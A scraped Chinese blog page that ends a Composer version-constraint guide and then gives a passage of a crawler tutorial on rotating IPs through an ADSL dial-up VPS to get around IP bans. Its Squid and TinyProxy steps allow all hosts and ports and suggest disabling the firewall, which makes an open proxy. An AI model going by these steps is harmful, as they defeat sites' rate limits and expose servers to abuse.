                  <p>使用比较操作符你可以指定包的范围。这些操作符包括：<code>\&gt;</code>，<code>\&gt;=</code>，<code>&lt;</code>，<code>&lt;=</code>，<code>!=</code>。 你可以定义多个范围，使用空格 或者逗号<code>,</code>表示逻辑上的与，使用双竖线<code>||</code>表示逻辑上的或。其中与的优先级会大于或。</p>
                  <blockquote>
                    <p>需要注意的是，使用没有边界的范围有可能会导致安装不可预知的版本，并破坏向下的兼容性。建议使用折音号操作符。</p>
                  </blockquote>
                  <p>例子：</p>
                  <ul>
                    <li><code>\&gt;=1.0</code></li>
                    <li><code>\&gt;=1.0 &lt;2.0</code></li>
                    <li><code>\&gt;=1.0 &lt;1.1 || &gt;=1.2</code></li>
                  </ul>
                  <h4 id="范围（使用连字符）"><a href="#范围（使用连字符）" class="headerlink" title="范围（使用连字符）"></a>范围（使用连字符）</h4>
                  <p>带连字符的范围表明了包含的版本范围，意味着肯定是有边界的。其中连字符的左边表明了<code>\&gt;=</code>的版本，而连字符的右边情况则稍微有点复杂。如果右边的版本不是完整的版本号，则会被使用通配符进行补全。例如<code>1.0 - 2.0</code>等同于<code>\&gt;=1.0.0 &lt;2.1</code>（<code>2.0</code>相当于<code>2.0.*</code>），而<code>1.0.0 - 2.1.0</code>则等同于<code>\&gt;=1.0.0 &lt;=2.1.0</code>。 例子：<code>1.0 - 2.0</code></p>
                  <h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4>
                  <p>可以使用通配符去定义版本。<code>1.0.*</code>相当于<code>\&gt;=1.0 &lt;1.1</code>。 例子：<code>1.0.*</code></p>
                  <h3 id="下一个重要版本操作符"><a href="#下一个重要版本操作符" class="headerlink" title="下一个重要版本操作符"></a>下一个重要版本操作符</h3>
                  <h4 id="波浪号"><a href="#波浪号" class="headerlink" title="波浪号~"></a>波浪号<code>~</code></h4>
                  <p>我们先通过后面这个例子去解释<code>~</code>操作符的用法：<code>~1.2</code>相当于<code>\&gt;=1.2 &lt;2.0.0</code>，而<code>~1.2.3</code>相当于<code>\&gt;=1.2.3 &lt;1.3.0</code>。对于使用<a href="http://semver.org/" target="_blank" rel="noopener">Semantic Versioning</a>作为版本号标准的项目来说，这种版本约束方式很实用。例如<code>~1.2</code>定义了最小的小版本号，然后你可以升级2.0以下的任何版本而不会出问题，因为按照<a href="http://semver.org/" target="_blank" rel="noopener">Semantic Versioning</a>的版本定义，小版本的升级不应该有兼容性的问题。简单来说，<code>~</code>定义了最小的版本，并且允许版本的最后一位版本号进行升级（没懂得话，请再看一边前面的例子）。 例子：<code>~1.2</code></p>
                  <blockquote>
                    <p>需要注意的是，如果<code>~</code>作用在主版本号上，例如<code>~1</code>，按照上面的说法，Composer可以安装版本1以后的主版本，但是事实上是<code>~1</code>会被当作<code>~1.0</code>对待，只能增加小版本，不能增加主版本。</p>
                  </blockquote>
                  <h4 id="折音号"><a href="#折音号" class="headerlink" title="折音号^"></a>折音号<code>^</code></h4>
                  <p><code>^</code>操作符的行为跟<a href="http://semver.org/" target="_blank" rel="noopener">Semantic Versioning</a>有比较大的关联，它允许升级版本到安全的版本。例如，<code>^1.2.3</code>相当于<code>\&gt;=1.2.3 &lt;2.0.0</code>，因为在2.0版本前的版本应该都没有兼容性的问题。而对于1.0之前的版本，这种约束方式也考虑到了安全问题，例如<code>^0.3</code>会被当作<code>\&gt;=0.3.0 &lt;0.4.0</code>对待。 例子：<code>^1.2.3</code></p>
                  <h3 id="版本稳定性"><a href="#版本稳定性" class="headerlink" title="版本稳定性"></a>版本稳定性</h3>
                  <p>如果你没有显式的指定版本的稳定性，Composer会根据使用的操作符，默认在内部指定为<code>\-dev</code>或者<code>\-stable</code>。例如：</p>
                  <p>约束</p>
                  <p>内部约束</p>
                  <p>1.2.3</p>
                  <p>\=1.2.3.0-stable</p>
                  <p>>1.2</p>
                  <p>>1.2.0.0-stable</p>
                  <p>>=1.2</p>
                  <p>>=1.2.0.0-dev</p>
                  <p>>=1.2-stable</p>
                  <p>>=1.2.0.0-stable</p>
                  <p>&lt;1.3</p>
                  <p>&lt;1.3.0.0-dev</p>
                  <p>&lt;=1.3</p>
                  <p>&lt;=1.3.0.0-stable</p>
                  <p>1 - 2</p>
                  <p>>=1.0.0.0-dev &lt;3.0.0.0-dev</p>
                  <p>~1.3</p>
                  <p>>=1.3.0.0-dev &lt;2.0.0.0-dev</p>
                  <p>1.4.*</p>
                  <p>>=1.4.0.0-dev &lt;1.5.0.0-dev</p>
                  <p>如果你想指定版本只要稳定版本，你可以在版本后面添加后缀<code>\-stable</code>。 <code>minimum-stability</code> 配置项定义了包在选择版本时对稳定性的选择的默认行为。默认是<code>stable</code>。它的值如下（按照稳定性排序）：<code>dev</code>，<code>alpha</code>，<code>beta</code>，<code>RC</code>和<code>stable</code>。除了修改这个配置去修改这个默认行为，我们还可以通过<a href="https://getcomposer.org/doc/04-schema.md#package-links" target="_blank" rel="noopener">稳定性标识</a>（例如<code>@stable</code>和<code>@dev</code>）来安装一个相比于默认配置不同稳定性的版本。例如：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"monolog/monolog"</span>: <span class="string">"1.0.*@beta"</span>,</span><br><span class="line">        <span class="attr">"acme/foo"</span>: <span class="string">"@dev"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上是版本约束的介绍</p>
                  <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>
                  <ul>
                    <li><a href="https://segmentfault.com/a/1190000005898222" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005898222</a></li>
                    <li><a href="https://getcomposer.org/doc/03-cli.md%5B2%5D" target="_blank" rel="noopener">https://getcomposer.org/doc/03-cli.md[2]</a></li>
                    <li><a href="https://getcomposer.org/doc/articles/versions.md%5B3%5D" target="_blank" rel="noopener">https://getcomposer.org/doc/articles/versions.md[3]</a></li>
                    <li><a href="http://semver.org/%5B1%5D" target="_blank" rel="noopener">http://semver.org/[1]</a></li>
                  </ul>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-11-26 18:00:10" itemprop="dateCreated datePublished" datetime="2016-11-26T18:00:10+08:00">2016-11-26</time>
                </span>
                <span id="/3494.html" class="post-meta-item leancloud_visitors" data-flag-title="Composer进阶使用之常用命令和版本约束" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>4k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>4 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3443.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3443.html" class="post-title-link" itemprop="url">Python爬虫进阶七之设置ADSL拨号服务器代理</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="2022-年最新-Python3-网络爬虫教程"><a href="#2022-年最新-Python3-网络爬虫教程" class="headerlink" title="2022 年最新 Python3 网络爬虫教程"></a>2022 年最新 Python3 网络爬虫教程</h2>
                  <p>大家好，我是崔庆才，由于爬虫技术不断迭代升级，一些旧的教程已经过时、案例已经过期，最前沿的爬虫技术比如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等技术层出不穷，我最近新出了一套最新最全面的 Python3 网络爬虫系列教程。</p>
                  <blockquote>
                    <p>博主自荐：截止 2022 年，可以将最前沿最全面的爬虫技术都涵盖的教程，如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等，市面上目前就这一套了。</p>
                  </blockquote>
                  <p>最新教程对旧的爬虫技术内容进行了全面更新，搭建了全新的案例平台进行全面讲解，保证案例稳定有效不过期。</p>
                  <p>教程请移步：</p>
                  <p><a href="https://cuiqingcai.com/17777.html">【2022 版】Python3 网络爬虫学习教程</a></p>
                  <p>如下为原文。</p>
                  <h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2>
                  <p>本教程方法已不是最优，最新解决方案请移步 <a href="http://cuiqingcai.com/4596.html">http://cuiqingcai.com/4596.html</a></p>
                  <h2 id="那夜"><a href="#那夜" class="headerlink" title="那夜"></a>那夜</h2>
                  <p>那是一个寂静的深夜，科比还没起床练球，虽然他真的可能不练了。 我废了好大劲，爬虫终于写好了！BUG 也全部调通了！心想，终于可以坐享其成了！ 泡杯茶，安静地坐在椅子上看着屏幕上一行行文字在控制台跳出，一条条数据嗖嗖进入我的数据库，一张张图片悄悄存入我的硬盘。人生没有几个比这更惬意的事情了。 我端起茶杯，抿了一口，静静地回味着茶香。 这时，什么情况！屏幕爆红了！爆红了！一口茶的功夫啊喂！ 怎么回事！咋爬不动了，不动了！我用浏览器点开那一个个报错的链接，浏览器显示</p>
                  <blockquote>
                    <p>您的请求过于频繁，IP 已经被暂时封禁，请稍后再试！</p>
                  </blockquote>
                  <p>沃日，我 IP 被封了？此时此刻，空气凝固了，茶也不再香了，请给我一个爱的抱抱啊。 时候不早了，还是洗洗睡吧。</p>
                  <h2 id="次日"><a href="#次日" class="headerlink" title="次日"></a>次日</h2>
                  <p>那一晚，辗转反侧难以入睡。 怎么办？怎么办？如果是你你该怎么办？ 手动换个 IP？得了吧，一会又要封了，还能不能安心睡觉啊？ 找免费代理？可行，不过我之前测过不少免费代理 IP，一大半都不好用，而且慢。不过可以一直维护一个代理池，定时更新。 买代理？可以可以，不过优质的代理服务商价格可是不菲的，我买过一些廉价的，比如几块钱套餐一次提取几百 IP 的，算了还是不说了都是泪。 然而最行之有效的方法是什么？那当然是 ADSL 拨号！ 这是个啥？且听我慢慢道来。</p>
                  <h2 id="什么是-ADSL"><a href="#什么是-ADSL" class="headerlink" title="什么是 ADSL"></a>什么是 ADSL</h2>
                  <p>ADSL （Asymmetric Digital Subscriber Line ，非对称数字用户环路）是一种新的数据传输方式。它因为上行和下行带宽不对称，因此称为非对称数字用户线环路。它采用频分复用技术把普通的电话线分成了电话、上行和下行三个相对独立的信道，从而避免了相互之间的干扰。 他有个独有的特点，每拨一次号，就获取一个新的 IP。也就是它的 IP 是不固定的，不过既然是拨号上网嘛，速度也是有保障的，用它搭建一个代理，那既能保证可用，又能自由控制拨号切换。 如果你是用的 ADSL 上网方式，那就不用过多设置了，直接自己电脑调用一个拨号命令就好了，自动换 IP，分分钟解决封 IP 的事。 然而，你可能说？我家宽带啊，我连得公司无线啊，我蹭的网上的啊！那咋办？ 这时，你就需要一台 VPS 拨号主机。</p>
                  <h2 id="购买服务器"><a href="#购买服务器" class="headerlink" title="购买服务器"></a>购买服务器</h2>
                  <p>某度广告做的那么好是吧？一搜一片，这点谷歌可是远远比不上啊。 于是乎，我就搜了搜，键入：拨号服务器，有什么骑士互联啊、无极网络啊、挂机宝啊等等的。我选了个价钱还凑合的，选了个无极网络（这里不是在打广告），80 一个月的配置，一天两块钱多点。 2 核、512M 内存，10M 带宽。 <a href="http://www.yunlifang.cn/" target="_blank" rel="noopener">云立方</a> 大家觉得有更便宜的更好用请告诉我呀！ 接下来开始装操作系统，进入后台，有一个自助装系统的页面。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161121-0.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161121-0-1024x399.png" alt="QQ20161121-0"></a> 我装的 CentOS 的，在后面设置代理啊，定时任务啊，远程 SSH 管理啊之类的比较方便。如果你想用 Windows，能配置好代理那也没问题。 有的小伙伴可能会问了，既然它的 IP 是拨号变化的，你咋用 SSH 连？其实服务商提供了一个域名，做了动态解析和端口映射，映射到这台主机的 22 端口就好了，所以不用担心 IP 变化导致 SSH 断开的问题。 好了装好了服务器之后，服务商提供了一个 ADSL 的拨号操作过程，用 pppoe 命令都可以完成，如果你的是 Linux 的主机一般都是用这个。然后服务商还会给给你一个拨号账号和密码。 那么接下来就是试下拨号了。 服务商会提供详细的拨号流程说明。 比如无极的是这样的： <a href="http://cloud.871020.com/vpsadm/pppoe.html" target="_blank" rel="noopener">拨号流程</a> 设置好了之后，就有几个关键命令：</p>
                  <figure class="highlight sql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pppoe-<span class="keyword">start</span> 拨号</span><br><span class="line">pppoe-<span class="keyword">stop</span>  断开拨号</span><br><span class="line">pppoe-<span class="keyword">status</span> 拨号连接状态</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果想重新拨号，那就执行 stop、start 就可以了。 反复执行，然后查看下 ip 地址，你会发现拨号一次换一个 IP，是不是爽翻了！ 好，那接下来就设置代理吧。</p>
                  <h2 id="设置代理服务器"><a href="#设置代理服务器" class="headerlink" title="设置代理服务器"></a>设置代理服务器</h2>
                  <p>之前总是用别人的代理，没自己设置过吧？那么接下来我们就来亲自搭建 HTTP 代理。 Linux 下搭建 HTTP 代理，推荐 Squid 和 TinyProxy。都非常好配置，你想用哪个都行，且听我慢慢道来。 我的系统是 CentOS，以它为例进行说明。</p>
                  <h3 id="Squid"><a href="#Squid" class="headerlink" title="Squid"></a>Squid</h3>
                  <p>首先利用 yum 安装 squid</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">yum -y <span class="keyword">install</span> squid</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>设置开机启动</p>
                  <figure class="highlight nginx">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">chkconfig</span> --level <span class="number">35</span> squid <span class="literal">on</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改配置文件</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">vi</span> /etc/squid/squid.<span class="keyword">conf</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改如下几个部分：</p>
                  <figure class="highlight yaml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">http_access</span> <span class="string">allow</span> <span class="type">!Safe_ports</span>    <span class="comment">#deny改成allow</span></span><br><span class="line"><span class="string">http_access</span> <span class="string">allow</span> <span class="string">CONNECT</span> <span class="type">!SSL_ports</span>  <span class="comment">#deny改成allow</span></span><br><span class="line"><span class="string">http_access</span> <span class="string">allow</span> <span class="string">all</span>  <span class="comment">#deny改成allow</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其他的不需要过多配置。 启动 squid</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo<span class="built_in"> service </span>squid start</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如此一来配置就完成了。 代理使用的端口是 3128</p>
                  <h3 id="TinyProxy"><a href="#TinyProxy" class="headerlink" title="TinyProxy"></a>TinyProxy</h3>
                  <p>首先添加一下镜像源，然后安装</p>
                  <figure class="highlight properties">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">rpm</span> <span class="string">-Uvh http://dl.fedoraproject.org/pub/epel/5/i386/epel-release-5-4.noarch.rpm</span></span><br><span class="line"><span class="attr">yum</span> <span class="string">update</span></span><br><span class="line"><span class="attr">yum</span> <span class="string">install tinyproxy</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改配置</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">vi</span> /etc/tinyproxy/tinyproxy.<span class="keyword">conf</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以修改端口和允许的 IP，如果想任意主机都连接那就把 Allow 这一行注释掉。</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Port <span class="number">8888</span> #预设是<span class="number">8888</span> Port,你可以更改</span><br><span class="line">Allow <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> #将<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>改成你自己的IP</span><br><span class="line">#例如你的IP 是<span class="number">1.2</span><span class="number">.3</span><span class="number">.4</span>,你改成Allow <span class="number">1.2</span><span class="number">.3</span><span class="number">.4</span>,那只有你才可以连上这个Proxy</span><br><span class="line">#若你想任何IP都可以脸到Proxy在Allow前面打#注释</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>启动 TinyProxy</p>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">service tinyproxy <span class="literal">start</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好了，两个代理都配置好了。 你想用那个都可以！ 不过你以为这样就完了吗？太天真了，我被困扰了好几天，怎么都连不上，我还在怀疑是不是我哪里设置得不对？各种搜，一直以为是哪里配置有遗漏，后来发现是 iptables 的锅，万恶的防火墙。踩过的的坑，那就不要让大家踩了，用下面的命令设置下 iptables，放行 3128 和 8888 端口就好了。</p>
                  <figure class="highlight properties">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">service</span> <span class="string">iptables save</span></span><br><span class="line"><span class="attr">systemctl</span> <span class="string">stop firewalld</span></span><br><span class="line"><span class="attr">systemctl</span> <span class="string">disable  firewalld</span></span><br><span class="line"><span class="attr">systemctl</span> <span class="string">start iptables</span></span><br><span class="line"><span class="attr">systemctl</span> <span class="string">status iptables</span></span><br><span class="line"><span class="attr">systemctl</span> <span class="string">enable iptables</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改 iptables 配置</p>
                  <figure class="highlight awk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">vi <span class="regexp">/etc/</span>sysconfig<span class="regexp">/iptables</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在</p>
                  <figure class="highlight brainfuck">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="literal">-</span><span class="comment">A</span> <span class="comment">IN_public_allow</span> <span class="literal">-</span><span class="comment">p</span> <span class="comment">tcp</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">tcp</span> --<span class="comment">dport</span> <span class="comment">22</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">conntrack</span> --<span class="comment">ctstate</span> <span class="comment">NEW</span> <span class="literal">-</span><span class="comment">j</span> <span class="comment">ACCEPT</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>的下面添加两条规则</p>
                  <figure class="highlight brainfuck">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="literal">-</span><span class="comment">A</span> <span class="comment">IN_public_allow</span> <span class="literal">-</span><span class="comment">p</span> <span class="comment">tcp</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">tcp</span> --<span class="comment">dport</span> <span class="comment">3128</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">conntrack</span> --<span class="comment">ctstate</span> <span class="comment">NEW</span> <span class="literal">-</span><span class="comment">j</span> <span class="comment">ACCEPT</span></span><br><span class="line"><span class="comment"></span><span class="literal">-</span><span class="comment">A</span> <span class="comment">IN_public_allow</span> <span class="literal">-</span><span class="comment">p</span> <span class="comment">tcp</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">tcp</span> --<span class="comment">dport</span> <span class="comment">8888</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">conntrack</span> --<span class="comment">ctstate</span> <span class="comment">NEW</span> <span class="literal">-</span><span class="comment">j</span> <span class="comment">ACCEPT</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如图所示 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161121-0@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161121-0@2x-1024x688.png" alt="QQ20161121-0@2x"></a> 保存，然后重启 iptables</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo<span class="built_in"> service </span>iptabels restart</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>输入 ifconfig 得到 IP 地址，在其他的主机上输入</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">curl</span> <span class="selector-tag">-x</span> <span class="selector-tag">IP</span><span class="selector-pseudo">:8888</span> <span class="selector-tag">www</span><span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试一下，如果能出现结果，那就说明没问题。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161121-1@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161121-1@2x-1024x688.png" alt="QQ20161121-1@2x"></a> 如果怎么配都连不上，那干脆关了你的防火墙吧。虽然不推荐。</p>
                  <h2 id="连接代理"><a href="#连接代理" class="headerlink" title="连接代理"></a>连接代理</h2>
                  <p>接下来才是重头戏，你咋知道你的服务器 IP 现在到底是多少啊？拨一次号 IP 就换一次，那这还了得？ 如果服务商提供了端口映射！那一切都解决了！直接用端口映射过去就好了。然而，我的并没有。 自力更生，艰苦创业！ 首先我研究了一下 DDNS 服务，也就是动态域名解析。即使你的 IP 在变化，那也可以通过一个域名来映射过来。 原理简单而统一：当前拨号主机定时向一个固定的服务器发请求，服务器获取 remote_addr 就好了，可以做到定时更新和解析。 那么我找了一下，国内做的比较好的就是花生壳了，然后又找到了 DNSPOD 的接口解析。 下面简单说下我的折腾过程，大家可以先不用试，后面有更有效的方法。</p>
                  <h3 id="花生壳"><a href="#花生壳" class="headerlink" title="花生壳"></a>花生壳</h3>
                  <p>现在花生壳出到 3.0 版本了，有免费版和付费版之分，我就试用了一下免费版的。这里是花生壳的一些配置和下载： <a href="http://service.oray.com/question/4287.html" target="_blank" rel="noopener">花生壳配置</a> 下载花生壳客户端之后，会生成 SN 码，用这个在花生壳的官网登录后，会分配给你一个免费的域名。 接下来这个域名就能解析到你的主机了。</p>
                  <h3 id="DNSPOD"><a href="#DNSPOD" class="headerlink" title="DNSPOD"></a>DNSPOD</h3>
                  <p>DNSPOD 原理也是一样，不过好处是你可以配置自己的域名。 在 GitHub 上有脚本可以使用。 <a href="https://github.com/xdtianyu/scripts/tree/master/ddns" target="_blank" rel="noopener">脚本链接</a> 具体的细节我就不说了，实际上就是定时请求，利用 remote_addr 更新 DNSPOD 记录，做到动态解析。 <a href="https://www.dnspod.cn/docs/records.html#dns" target="_blank" rel="noopener">解析接口</a> 不过！这两个有个通病！慢！ 什么慢？解析慢！但这不是他们的锅，因为 DNS 修改后完全生效就是需要一定的时间，这一秒你拨号了，然后更新了 IP，但是域名可能还是解析着原来的 IP，需要过几分钟才能变过来。这能忍吗？ 我可是在跑爬虫啊，这还能忍？</p>
                  <h2 id="自力更生"><a href="#自力更生" class="headerlink" title="自力更生"></a>自力更生</h2>
                  <p>嗯，V2EX 果然是个好地方，逛了一下，收获不小。 <a href="https://www.v2ex.com/t/249694" target="_blank" rel="noopener">链接在此</a> 参考了 abelyao 的思路，自己写了脚本来获取 IP，保证秒级更新！ 此时，你还需要另一台固定 IP 的主机或者某个云服务器，只要是地址固定的就好。在这里我用了另一台有固定 IP 的阿里云主机，当然你如果有什么新浪云啊之类的也可以。 那么现在的思路就是，拨号 VPS 定时拨号换 IP，然后请求阿里云主机，阿里云主机获取 VPS 的 IP 地址即可。 拨号 VPS 做的事情： 定时拨号，定时请求服务器。使用 bash 脚本，然后 crontab 定时执行。 远程服务器： 接收请求，获取 remote_addr，保存起来。使用 Flask 搭建服务器，接收请求。 废话少说，上代码 <a href="https://github.com/Germey/AutoProxy" target="_blank" rel="noopener">AutoProxy</a></p>
                  <h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3>
                  <p>由于 DDNS 生效时间过长，对于爬虫等一些时间要求比较紧迫的项目就不太适用，为此本项目根据 DDNS 基本原理来实现实时获取 ADSL 拨号主机 IP。</p>
                  <h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3>
                  <p>client 文件夹由 ADSL 拨号客户机运行。它会定时执行拨号操作，然后请求某个固定地址的服务器，以便让服务器获取 ADSL 拨号客户机的 IP，主要是定时 bash 脚本运行。 server 文件夹是服务器端运行，利用 Python 的 Flask 搭建服务器，然后接收 ADSL 拨号客户机的请求，得到 remote_addr，获取客户机拨号后的 IP。</p>
                  <h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3>
                  <h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4>
                  <ul>
                    <li>config.py 配置文件。</li>
                    <li>ip 客户端请求后获取的客户端 IP，文本保存。</li>
                    <li>main.py Flask 主程序，提供两个接口，一个是接收客户端请求，然后将 IP 保存，另外一个是获取当前保存的 IP。</li>
                  </ul>
                  <h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4>
                  <ul>
                    <li>crontab 定时任务命令示例。</li>
                    <li>pppoe.sh 拨号脚本，主要是实现重新拨号的几个命令。</li>
                    <li>request.sh 请求服务器的脚本，主要是实现拨号后请求服务器的操作。</li>
                    <li>request.conf 配置文件。</li>
                  </ul>
                  <h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3>
                  <h4 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h4>
                  <p>服务器提供两个功能，record 方法是客户机定时请求，然后获取客户机 IP 并保存。proxy 方法是供我们自己用，返回保存的客户机 IP，提取代理。</p>
                  <h5 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h5>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/Germey/AutoProxy.git</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h5 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h5>
                  <p>修改 config.py 文件</p>
                  <ul>
